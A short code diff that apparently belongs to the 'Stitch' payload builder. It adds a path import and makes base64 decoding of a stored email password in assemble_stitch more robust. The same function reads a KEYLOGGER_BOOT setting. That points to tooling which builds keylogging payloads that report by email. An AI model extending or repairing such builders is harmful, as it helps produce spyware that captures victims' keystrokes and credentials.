@@ -12,6 +12,7 @@ from .stitch_utils import (
 )
 # Specific imports from stitch_pyld_config
 from .stitch_pyld_config import stitch_ini, get_conf_dir, gen_default_st_config
+from .Stitch_Vars.globals import configuration_path, payloads_path
 
 # Specific imports from Stitch_Vars.nsis
 from .Stitch_Vars.nsis import gen_nsis
@@ -53,7 +54,12 @@ def assemble_stitch():
 
     EMAIL = stini.get_value("EMAIL")
     email_pwd_encoded = stini.get_value("EMAIL_PWD")
-    EMAIL_PWD = base64.b64decode(email_pwd_encoded).decode('utf-8') if email_pwd_encoded else ""
+    EMAIL_PWD = ""
+    if email_pwd_encoded and email_pwd_encoded != "None":
+        try:
+            EMAIL_PWD = base64.b64decode(email_pwd_encoded).decode('utf-8')
+        except (ValueError, UnicodeDecodeError):
+            EMAIL_PWD = ""
     KEYLOGGER_BOOT = stini.get_bool("KEYLOGGER_BOOT")
 
     main_code = ''
